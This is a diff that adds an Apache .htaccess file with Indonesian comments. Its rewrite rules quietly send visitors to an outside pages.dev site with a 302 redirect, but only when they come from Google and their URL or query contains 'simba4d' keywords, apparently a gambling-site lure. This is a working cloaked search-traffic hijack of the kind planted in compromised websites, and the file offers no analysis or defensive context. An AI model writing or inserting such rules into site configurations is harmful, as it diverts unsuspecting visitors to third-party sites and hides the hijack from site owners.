@@ -1,0 +1,13 @@
+RewriteEngine On
+
+# Jangan redirect kalau sudah di AMP
+RewriteCond %{HTTP_HOST} !leetampu-bukit-kodok\.pages\.dev$ [NC]
+
+# Harus dari Google
+RewriteCond %{HTTP_REFERER} google\. [NC]
+
+# Cek keyword di URL atau query
+RewriteCond %{REQUEST_URI} (simba4d|simba-?4d|simba4d.*login) [NC,OR]
+RewriteCond %{QUERY_STRING} (simba4d|simba-?4d|simba4d.*login) [NC]
+
+RewriteRule ^(.*)$ https://leetampu-bukit-kodok.pages.dev/ [R=302,L]
